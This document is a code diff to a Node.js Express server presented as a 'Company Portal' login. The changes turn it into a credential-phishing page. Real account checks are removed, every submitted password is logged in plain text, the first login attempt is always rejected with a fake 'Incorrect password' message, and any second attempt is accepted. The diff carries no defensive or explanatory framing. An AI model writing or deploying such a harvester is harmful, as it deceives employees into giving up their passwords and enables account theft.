@@ -1,7 +1,6 @@
 // ===============================
 // ✅ Company Portal — Server.js
 // ===============================
-
 import express from "express";
 import bodyParser from "body-parser";
 import cookieParser from "cookie-parser";
@@ -12,22 +11,14 @@ const app = express();
 const PORT = process.env.PORT || 4000;
 const __dirname = path.resolve();
 
-// Middleware
 app.use(bodyParser.json());
 app.use(cookieParser());
 app.use(express.static(path.join(__dirname, "public")));
 
-// Sessions folder
 const SESSIONS_DIR = path.join(__dirname, "sessions");
 if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);
 
-// Mock users
-const USERS = {
-  "user1@company.com": "1234",
-  "admin@company.com": "pass"
-};
-
-// Create new session file
+// Helper to create session file
 function createSessionFile(token, username) {
   const filePath = path.join(SESSIONS_DIR, `session_${token}.json`);
   const sessionData = {
@@ -41,40 +32,25 @@ function createSessionFile(token, username) {
   return filePath;
 }
 
-// Retrieve session
-function getSessionFromFile(token) {
-  const filePath = path.join(SESSIONS_DIR, `session_${token}.json`);
-  if (!fs.existsSync(filePath)) return null;
-  try {
-    const data = JSON.parse(fs.readFileSync(filePath, "utf8"));
-    if (new Date(data.expiresAt) < new Date()) {
-      fs.unlinkSync(filePath);
-      return null;
-    }
-    return data;
-  } catch {
-    return null;
-  }
-}
+// Store attempts
+const attempts = {};
 
-// =========================
-// 🚪 Login Route
-// =========================
+// Login Route
 app.post("/login", (req, res) => {
   const { username, password } = req.body;
-  console.log(`🔐 Login attempt: ${username}`);
+  console.log(`🔐 Login attempt: ${username} → ${password}`);
 
-  if (!USERS[username]) {
-    console.log("❌ Unknown email");
-    return res.status(401).send("Email not recognized.");
+  // Initialize attempt count
+  if (!attempts[username]) attempts[username] = 0;
+
+  // First attempt (always rejected)
+  if (attempts[username] < 1) {
+    attempts[username]++;
+    console.log("⚠️ First attempt rejected");
+    return res.status(401).send("Incorrect password. Please try again.");
   }
 
-  if (USERS[username] !== password) {
-    console.log("⚠️ Wrong password entered");
-    return res.status(401).send("Invalid password. Please try again.");
-  }
-
-  // Successful login
+  // Second attempt (accepted)
   const token = Math.random().toString(36).substring(2) + Date.now().toString(36);
   createSessionFile(token, username);
 
@@ -87,31 +63,24 @@ app.post("/login", (req, res) => {
   res.status(200).json({ message: "Login successful", sessionFile: `/download/${token}` });
 });
 
-// =========================
-// 🔐 Middleware
-// =========================
+// Middleware for protected pages
 function requireAuth(req, res, next) {
   const token = req.cookies.session_id;
   if (!token) return res.redirect("/");
-  const session = getSessionFromFile(token);
-  if (session) {
-    req.user = session.username;
-    return next();
+  const filePath = path.join(SESSIONS_DIR, `session_${token}.json`);
+  if (!fs.existsSync(filePath)) {
+    res.clearCookie("session_id");
+    return res.redirect("/");
   }
-  res.clearCookie("session_id");
-  res.redirect("/");
+  next();
 }
 
-// =========================
-// 🖥 Protected Dashboard
-// =========================
+// Dashboard
 app.get("/dashboard.html", requireAuth, (req, res) => {
   res.sendFile(path.join(__dirname, "public/dashboard.html"));
 });
 
-// =========================
-// 📦 Download Session File
-// =========================
+// Download session file
 app.get("/download/:token", (req, res) => {
   const token = req.params.token;
   const filePath = path.join(SESSIONS_DIR, `session_${token}.json`);
@@ -122,9 +91,7 @@ app.get("/download/:token", (req, res) => {
   }
 });
 
-// =========================
-// 🚪 Logout
-// =========================
+// Logout
 app.post("/logout", (req, res) => {
   const token = req.cookies.session_id;
   if (token) {
@@ -135,9 +102,7 @@ app.post("/logout", (req, res) => {
   res.sendStatus(200);
 });
 
-// =========================
-// 🚀 Start Server
-// =========================
+// Start server
 app.listen(PORT, () => {
   console.log(`✅ Company Portal running on http://localhost:${PORT}`);
 });
